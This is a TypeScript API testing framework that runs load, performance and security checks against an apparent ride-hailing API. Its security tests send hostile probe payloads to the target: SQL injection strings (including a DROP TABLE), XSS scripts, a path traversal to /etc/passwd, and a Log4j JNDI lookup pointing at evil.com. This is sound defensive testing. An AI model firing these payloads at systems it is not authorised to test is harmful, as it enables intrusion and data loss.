// API Gateway Testing Framework
// Comprehensive load testing, security testing, and performance validation

import axios, { AxiosRequestConfig, AxiosResponse } from 'axios';
import { performance } from 'perf_hooks';

// Test Configuration
export interface TestConfig {
  baseUrl: string;
  apiKey?: string;
  jwtToken?: string;
  timeout: number;
  loadTest: {
    concurrent: number;
    duration: number; // seconds
    rampUp: number; // seconds
    targetRPS: number;
  };
  securityTest: {
    enableSQLInjection: boolean;
    enableXSSTests: boolean;
    enableAuthTests: boolean;
    enableRateLimitTests: boolean;
  };
  performance: {
    maxResponseTime: number;
    acceptableErrorRate: number; // percentage
  };
}

// Test Result Types
export interface TestResult {
  success: boolean;
  duration: number;
  statusCode?: number;
  responseTime: number;
  error?: string;
  details?: Record<string, any>;
}

export interface LoadTestResult {
  totalRequests: number;
  successfulRequests: number;
  failedRequests: number;
  averageResponseTime: number;
  p95ResponseTime: number;
  p99ResponseTime: number;
  maxResponseTime: number;
  minResponseTime: number;
  requestsPerSecond: number;
  errorRate: number;
  errors: Array<{ error: string; count: number }>;
  timeline: Array<{
    timestamp: number;
    requestsPerSecond: number;
    averageResponseTime: number;
    errorRate: number;
  }>;
}

export interface SecurityTestResult {
  testType: string;
  vulnerable: boolean;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  payload?: string;
  response?: string;
  recommendation: string;
}

export interface PerformanceTestResult {
  endpoint: string;
  method: string;
  averageResponseTime: number;
  minResponseTime: number;
  maxResponseTime: number;
  p95ResponseTime: number;
  p99ResponseTime: number;
  throughput: number;
  passed: boolean;
  issues: string[];
}

export class ApiTester {
  private config: TestConfig;
  private results: TestResult[] = [];
  private startTime: number = 0;

  constructor(config: TestConfig) {
    this.config = config;
  }

  /**
   * Run comprehensive API tests
   */
  async runAllTests(): Promise<{
    loadTest: LoadTestResult;
    securityTests: SecurityTestResult[];
    performanceTests: PerformanceTestResult[];
    summary: {
      passed: boolean;
      totalTests: number;
      passedTests: number;
      failedTests: number;
      duration: number;
      issues: string[];
    };
  }> {
    console.log('🚀 Starting comprehensive API tests...');
    const allStartTime = performance.now();

    // Run performance tests first (baseline)
    console.log('📊 Running performance tests...');
    const performanceTests = await this.runPerformanceTests();

    // Run security tests
    console.log('🛡️ Running security tests...');
    const securityTests = await this.runSecurityTests();

    // Run load tests last (most intensive)
    console.log('⚡ Running load tests...');
    const loadTest = await this.runLoadTest();

    const totalDuration = performance.now() - allStartTime;

    // Calculate summary
    const totalTests = performanceTests.length + securityTests.length + 1; // +1 for load test
    const failedPerformanceTests = performanceTests.filter(t => !t.passed).length;
    const failedSecurityTests = securityTests.filter(t => t.vulnerable && t.severity !== 'low').length;
    const loadTestFailed = loadTest.errorRate > this.config.performance.acceptableErrorRate ? 1 : 0;
    
    const failedTests = failedPerformanceTests + failedSecurityTests + loadTestFailed;
    const passedTests = totalTests - failedTests;

    const issues: string[] = [];
    
    // Collect issues
    performanceTests.forEach(test => issues.push(...test.issues));
    securityTests.filter(t => t.vulnerable && t.severity !== 'low')
      .forEach(test => issues.push(`Security vulnerability: ${test.testType} - ${test.description}`));
    
    if (loadTest.errorRate > this.config.performance.acceptableErrorRate) {
      issues.push(`High error rate: ${loadTest.errorRate.toFixed(2)}% (threshold: ${this.config.performance.acceptableErrorRate}%)`);
    }

    const summary = {
      passed: failedTests === 0,
      totalTests,
      passedTests,
      failedTests,
      duration: totalDuration / 1000, // Convert to seconds
      issues,
    };

    console.log('✅ All tests completed!');
    console.log(`📈 Summary: ${passedTests}/${totalTests} tests passed in ${summary.duration.toFixed(2)}s`);
    
    return {
      loadTest,
      securityTests,
      performanceTests,
      summary,
    };
  }

  /**
   * Run load tests with configurable parameters
   */
  async runLoadTest(endpoints: string[] = ['/api/health', '/api/status']): Promise<LoadTestResult> {
    console.log(`📈 Starting load test: ${this.config.loadTest.concurrent} concurrent users for ${this.config.loadTest.duration}s`);
    
    this.results = [];
    this.startTime = performance.now();
    
    const promises: Promise<void>[] = [];
    const timeline: LoadTestResult['timeline'] = [];
    
    // Create timeline tracking
    const timelineInterval = setInterval(() => {
      const currentResults = [...this.results];
      const last10s = currentResults.filter(r => 
        (performance.now() - this.startTime) - r.duration < 10000
      );
      
      if (last10s.length > 0) {
        const avgResponseTime = last10s.reduce((sum, r) => sum + r.responseTime, 0) / last10s.length;
        const errorCount = last10s.filter(r => !r.success).length;
        
        timeline.push({
          timestamp: Date.now(),
          requestsPerSecond: last10s.length / 10,
          averageResponseTime: avgResponseTime,
          errorRate: (errorCount / last10s.length) * 100,
        });
      }
    }, 10000); // Every 10 seconds

    // Ramp up users gradually
    const rampUpDelay = (this.config.loadTest.rampUp * 1000) / this.config.loadTest.concurrent;
    
    for (let i = 0; i < this.config.loadTest.concurrent; i++) {
      const userPromise = new Promise<void>((resolve) => {
        setTimeout(async () => {
          await this.runUserSession(endpoints, this.config.loadTest.duration);
          resolve();
        }, i * rampUpDelay);
      });
      
      promises.push(userPromise);
    }

    // Wait for all users to complete
    await Promise.all(promises);
    clearInterval(timelineInterval);

    // Calculate metrics
    const responseTimes = this.results.map(r => r.responseTime).sort((a, b) => a - b);
    const successfulResults = this.results.filter(r => r.success);
    const failedResults = this.results.filter(r => !r.success);
    
    const p95Index = Math.floor(responseTimes.length * 0.95);
    const p99Index = Math.floor(responseTimes.length * 0.99);
    
    const totalDuration = (performance.now() - this.startTime) / 1000;
    
    // Count errors
    const errorCounts: Record<string, number> = {};
    failedResults.forEach(result => {
      const error = result.error || 'Unknown error';
      errorCounts[error] = (errorCounts[error] || 0) + 1;
    });
    
    const errors = Object.entries(errorCounts).map(([error, count]) => ({ error, count }));

    const result: LoadTestResult = {
      totalRequests: this.results.length,
      successfulRequests: successfulResults.length,
      failedRequests: failedResults.length,
      averageResponseTime: responseTimes.length > 0 ? responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length : 0,
      p95ResponseTime: responseTimes[p95Index] || 0,
      p99ResponseTime: responseTimes[p99Index] || 0,
      maxResponseTime: Math.max(...responseTimes, 0),
      minResponseTime: Math.min(...responseTimes, 0),
      requestsPerSecond: this.results.length / totalDuration,
      errorRate: (failedResults.length / this.results.length) * 100,
      errors,
      timeline,
    };

    console.log(`📊 Load test completed: ${result.requestsPerSecond.toFixed(2)} RPS, ${result.errorRate.toFixed(2)}% error rate`);
    
    return result;
  }

  /**
   * Run security tests
   */
  async runSecurityTests(): Promise<SecurityTestResult[]> {
    const securityResults: SecurityTestResult[] = [];

    // SQL Injection Tests
    if (this.config.securityTest.enableSQLInjection) {
      securityResults.push(...await this.testSQLInjection());
    }

    // XSS Tests
    if (this.config.securityTest.enableXSSTests) {
      securityResults.push(...await this.testXSS());
    }

    // Authentication Tests
    if (this.config.securityTest.enableAuthTests) {
      securityResults.push(...await this.testAuthentication());
    }

    // Rate Limiting Tests
    if (this.config.securityTest.enableRateLimitTests) {
      securityResults.push(...await this.testRateLimiting());
    }

    // Additional security tests
    securityResults.push(...await this.testInputValidation());
    securityResults.push(...await this.testHeaderSecurity());

    return securityResults;
  }

  /**
   * Run performance tests
   */
  async runPerformanceTests(): Promise<PerformanceTestResult[]> {
    const endpoints = [
      { method: 'GET', path: '/api/health' },
      { method: 'GET', path: '/api/status' },
      { method: 'GET', path: '/api/pricing/profiles' },
      { method: 'GET', path: '/api/drivers' },
      { method: 'GET', path: '/api/rides' },
      { method: 'POST', path: '/api/auth/login' },
    ];

    const results: PerformanceTestResult[] = [];

    for (const endpoint of endpoints) {
      console.log(`🎯 Testing ${endpoint.method} ${endpoint.path}`);
      const result = await this.testEndpointPerformance(endpoint.method, endpoint.path);
      results.push(result);
    }

    return results;
  }

  /**
   * Test endpoint performance
   */
  private async testEndpointPerformance(method: string, path: string): Promise<PerformanceTestResult> {
    const iterations = 10;
    const responseTimes: number[] = [];
    const issues: string[] = [];

    for (let i = 0; i < iterations; i++) {
      try {
        const startTime = performance.now();
        
        const config: AxiosRequestConfig = {
          method: method as any,
          url: `${this.config.baseUrl}${path}`,
          timeout: this.config.timeout,
          headers: {
            'User-Agent': 'API-Tester/1.0',
            'Content-Type': 'application/json',
          },
        };

        if (this.config.apiKey) {
          config.headers!['X-API-Key'] = this.config.apiKey;
        }

        if (this.config.jwtToken) {
          config.headers!['Authorization'] = `Bearer ${this.config.jwtToken}`;
        }

        // Add test data for POST requests
        if (method === 'POST' && path.includes('login')) {
          config.data = {
            email: 'test@example.com',
            password: 'testpassword',
          };
        }

        await axios(config);
        const responseTime = performance.now() - startTime;
        responseTimes.push(responseTime);

      } catch (error: any) {
        responseTimes.push(this.config.timeout); // Use timeout as max response time for errors
        if (error.response?.status >= 500) {
          issues.push(`Server error (${error.response.status}): ${error.response.statusText}`);
        }
      }
    }

    const averageResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
    const sortedTimes = responseTimes.sort((a, b) => a - b);
    const p95Index = Math.floor(sortedTimes.length * 0.95);
    const p99Index = Math.floor(sortedTimes.length * 0.99);

    // Check performance thresholds
    const passed = averageResponseTime <= this.config.performance.maxResponseTime;
    
    if (!passed) {
      issues.push(`Average response time (${averageResponseTime.toFixed(2)}ms) exceeds threshold (${this.config.performance.maxResponseTime}ms)`);
    }

    return {
      endpoint: path,
      method,
      averageResponseTime,
      minResponseTime: Math.min(...responseTimes),
      maxResponseTime: Math.max(...responseTimes),
      p95ResponseTime: sortedTimes[p95Index],
      p99ResponseTime: sortedTimes[p99Index],
      throughput: iterations / (Math.max(...responseTimes) / 1000), // Rough throughput calculation
      passed,
      issues,
    };
  }

  /**
   * SQL Injection security tests
   */
  private async testSQLInjection(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];
    
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "1' UNION SELECT 1,2,3,4 --",
      "' OR 1=1 --",
      "admin' --",
      "' OR 'x'='x",
    ];

    for (const payload of sqlPayloads) {
      try {
        const response = await axios.get(`${this.config.baseUrl}/api/pricing/profiles`, {
          params: { search: payload },
          timeout: this.config.timeout,
          headers: this.config.apiKey ? { 'X-API-Key': this.config.apiKey } : {},
        });

        // Check if the response indicates a successful injection
        // A proper response should either:
        // 1. Return an error (4xx/5xx status)
        // 2. Return empty results for injection attempts
        // 3. Return the same results as a normal query (properly sanitized)
        
        const isValidResponse = Array.isArray(response.data) || 
                               (typeof response.data === 'object' && response.data !== null);
        
        const responseSize = JSON.stringify(response.data).length;
        
        // Check for indicators of successful injection
        const hasUnexpectedData = responseSize > 2000; // Unusually large response
        const hasErrorIndicators = JSON.stringify(response.data).toLowerCase().includes('error');
        const hasSuccessfulInjection = 
          response.status === 200 && 
          isValidResponse && 
          !hasErrorIndicators &&
          responseSize > 10 && // Not just empty array []
          (hasUnexpectedData || JSON.stringify(response.data).includes(payload));
          
        const vulnerable = hasSuccessfulInjection;

        results.push({
          testType: 'SQL Injection',
          vulnerable,
          severity: vulnerable ? 'critical' : 'low',
          description: vulnerable 
            ? 'Endpoint may be vulnerable to SQL injection attacks' 
            : 'SQL injection attempt was properly blocked',
          payload,
          response: JSON.stringify(response.data).substring(0, 200),
          recommendation: vulnerable 
            ? 'Implement proper input validation and parameterized queries'
            : 'Continue monitoring for SQL injection attempts',
        });

      } catch (error: any) {
        // Error responses are generally good (blocked attacks)
        results.push({
          testType: 'SQL Injection',
          vulnerable: false,
          severity: 'low',
          description: 'SQL injection attempt was properly blocked',
          payload,
          recommendation: 'Continue current security measures',
        });
      }
    }

    return results;
  }

  /**
   * XSS security tests
   */
  private async testXSS(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];
    
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "javascript:alert('XSS')",
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
    ];

    for (const payload of xssPayloads) {
      try {
        const response = await axios.get(`${this.config.baseUrl}/api/drivers`, {
          params: { search: payload },
          timeout: this.config.timeout,
          headers: this.config.apiKey ? { 'X-API-Key': this.config.apiKey } : {},
        });

        // Check if payload is reflected in response
        const responseText = JSON.stringify(response.data);
        const vulnerable = responseText.includes(payload) || responseText.includes('script>');

        results.push({
          testType: 'XSS (Cross-Site Scripting)',
          vulnerable,
          severity: vulnerable ? 'high' : 'low',
          description: vulnerable 
            ? 'Endpoint may be vulnerable to XSS attacks' 
            : 'XSS attempt was properly sanitized',
          payload,
          recommendation: vulnerable 
            ? 'Implement proper output encoding and input sanitization'
            : 'Continue current XSS protection measures',
        });

      } catch (error: any) {
        results.push({
          testType: 'XSS (Cross-Site Scripting)',
          vulnerable: false,
          severity: 'low',
          description: 'XSS attempt was properly blocked',
          payload,
          recommendation: 'Continue current security measures',
        });
      }
    }

    return results;
  }

  /**
   * Authentication security tests
   */
  private async testAuthentication(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    // Test 1: Access protected endpoint without authentication
    try {
      const response = await axios.get(`${this.config.baseUrl}/api/drivers`, {
        timeout: this.config.timeout,
        // Intentionally no API key or JWT
      });

      results.push({
        testType: 'Authentication Bypass',
        vulnerable: response.status === 200,
        severity: response.status === 200 ? 'critical' : 'low',
        description: response.status === 200 
          ? 'Protected endpoint accessible without authentication'
          : 'Authentication properly enforced',
        recommendation: response.status === 200
          ? 'Ensure all protected endpoints require proper authentication'
          : 'Continue current authentication measures',
      });

    } catch (error: any) {
      results.push({
        testType: 'Authentication Bypass',
        vulnerable: false,
        severity: 'low',
        description: 'Authentication properly enforced',
        recommendation: 'Continue current authentication measures',
      });
    }

    // Test 2: Invalid token handling
    try {
      const response = await axios.get(`${this.config.baseUrl}/api/drivers`, {
        headers: { 'Authorization': 'Bearer invalid_token_12345' },
        timeout: this.config.timeout,
      });

      results.push({
        testType: 'Invalid Token Handling',
        vulnerable: response.status === 200,
        severity: response.status === 200 ? 'high' : 'low',
        description: response.status === 200 
          ? 'Invalid token accepted by the system'
          : 'Invalid token properly rejected',
        recommendation: response.status === 200
          ? 'Implement proper token validation'
          : 'Continue current token validation',
      });

    } catch (error: any) {
      results.push({
        testType: 'Invalid Token Handling',
        vulnerable: false,
        severity: 'low',
        description: 'Invalid token properly rejected',
        recommendation: 'Continue current token validation',
      });
    }

    return results;
  }

  /**
   * Rate limiting tests
   */
  private async testRateLimiting(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    console.log('🚦 Testing rate limiting...');
    
    const requests: Promise<AxiosResponse>[] = [];
    const rapidRequestCount = 50; // Send 50 requests rapidly

    for (let i = 0; i < rapidRequestCount; i++) {
      const request = axios.get(`${this.config.baseUrl}/api/health`, {
        timeout: this.config.timeout,
        headers: this.config.apiKey ? { 'X-API-Key': this.config.apiKey } : {},
        validateStatus: () => true, // Don't throw on 429
      });
      requests.push(request);
    }

    try {
      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      const successfulResponses = responses.filter(r => r.status === 200);

      const rateLimitingActive = rateLimitedResponses.length > 0;

      results.push({
        testType: 'Rate Limiting',
        vulnerable: !rateLimitingActive,
        severity: !rateLimitingActive ? 'medium' : 'low',
        description: rateLimitingActive
          ? `Rate limiting active: ${rateLimitedResponses.length}/${rapidRequestCount} requests blocked`
          : `No rate limiting detected: all ${successfulResponses.length} requests succeeded`,
        recommendation: !rateLimitingActive
          ? 'Implement rate limiting to prevent abuse'
          : 'Rate limiting is working correctly',
      });

    } catch (error) {
      results.push({
        testType: 'Rate Limiting',
        vulnerable: false,
        severity: 'low',
        description: 'Rate limiting test could not be completed',
        recommendation: 'Verify rate limiting configuration manually',
      });
    }

    return results;
  }

  /**
   * Input validation tests
   */
  private async testInputValidation(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    const malformedInputs = [
      'A'.repeat(10000), // Very long string
      '../../../etc/passwd', // Path traversal
      '%00%00%00', // Null bytes
      '${jndi:ldap://evil.com/a}', // Log4j injection
    ];

    for (const input of malformedInputs) {
      try {
        const response = await axios.get(`${this.config.baseUrl}/api/status`, {
          params: { test: input },
          timeout: this.config.timeout,
          headers: this.config.apiKey ? { 'X-API-Key': this.config.apiKey } : {},
        });

        // Server should handle malformed input gracefully
        const vulnerable = response.status >= 500; // Server error indicates poor input handling

        results.push({
          testType: 'Input Validation',
          vulnerable,
          severity: vulnerable ? 'medium' : 'low',
          description: vulnerable
            ? 'Server error when processing malformed input'
            : 'Malformed input handled properly',
          payload: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
          recommendation: vulnerable
            ? 'Implement comprehensive input validation and error handling'
            : 'Continue current input validation practices',
        });

      } catch (error: any) {
        // Controlled errors are okay
        const isControlledError = error.response?.status >= 400 && error.response?.status < 500;
        
        results.push({
          testType: 'Input Validation',
          vulnerable: !isControlledError,
          severity: !isControlledError ? 'medium' : 'low',
          description: isControlledError
            ? 'Malformed input properly rejected'
            : 'Unexpected error handling malformed input',
          payload: input.substring(0, 50) + (input.length > 50 ? '...' : ''),
          recommendation: isControlledError
            ? 'Continue current input validation practices'
            : 'Review error handling for edge cases',
        });
      }
    }

    return results;
  }

  /**
   * Security headers tests
   */
  private async testHeaderSecurity(): Promise<SecurityTestResult[]> {
    const results: SecurityTestResult[] = [];

    try {
      const response = await axios.get(`${this.config.baseUrl}/api/health`, {
        timeout: this.config.timeout,
        headers: this.config.apiKey ? { 'X-API-Key': this.config.apiKey } : {},
      });

      const headers = response.headers;
      const securityHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'strict-transport-security',
        'content-security-policy',
      ];

      const missingHeaders = securityHeaders.filter(header => !headers[header]);
      const hasSecurityHeaders = missingHeaders.length === 0;

      results.push({
        testType: 'Security Headers',
        vulnerable: !hasSecurityHeaders,
        severity: !hasSecurityHeaders ? 'medium' : 'low',
        description: hasSecurityHeaders
          ? 'All recommended security headers present'
          : `Missing security headers: ${missingHeaders.join(', ')}`,
        recommendation: !hasSecurityHeaders
          ? 'Add missing security headers to prevent common attacks'
          : 'Security headers are properly configured',
      });

    } catch (error) {
      results.push({
        testType: 'Security Headers',
        vulnerable: false,
        severity: 'low',
        description: 'Could not test security headers',
        recommendation: 'Verify security headers manually',
      });
    }

    return results;
  }

  /**
   * Run single user session for load testing
   */
  private async runUserSession(endpoints: string[], duration: number): Promise<void> {
    const endTime = Date.now() + (duration * 1000);
    
    while (Date.now() < endTime) {
      const endpoint = endpoints[Math.floor(Math.random() * endpoints.length)];
      await this.makeRequest(endpoint);
      
      // Random delay between requests (100ms - 1s)
      const delay = 100 + Math.random() * 900;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  /**
   * Make a single request and record results
   */
  private async makeRequest(endpoint: string): Promise<void> {
    const startTime = performance.now();
    
    try {
      const config: AxiosRequestConfig = {
        method: 'GET',
        url: `${this.config.baseUrl}${endpoint}`,
        timeout: this.config.timeout,
        headers: {
          'User-Agent': 'Load-Tester/1.0',
        },
      };

      if (this.config.apiKey) {
        config.headers!['X-API-Key'] = this.config.apiKey;
      }

      const response = await axios(config);
      const responseTime = performance.now() - startTime;
      
      this.results.push({
        success: true,
        duration: performance.now() - this.startTime,
        statusCode: response.status,
        responseTime,
      });

    } catch (error: any) {
      const responseTime = performance.now() - startTime;
      
      this.results.push({
        success: false,
        duration: performance.now() - this.startTime,
        statusCode: error.response?.status,
        responseTime,
        error: error.message,
        details: { endpoint },
      });
    }
  }
}

// Create default test configuration
export const createDefaultTestConfig = (baseUrl: string): TestConfig => ({
  baseUrl,
  timeout: 10000,
  loadTest: {
    concurrent: 10,
    duration: 60, // 1 minute
    rampUp: 30, // 30 seconds ramp up
    targetRPS: 50,
  },
  securityTest: {
    enableSQLInjection: true,
    enableXSSTests: true,
    enableAuthTests: true,
    enableRateLimitTests: true,
  },
  performance: {
    maxResponseTime: 1000, // 1 second
    acceptableErrorRate: 1, // 1%
  },
});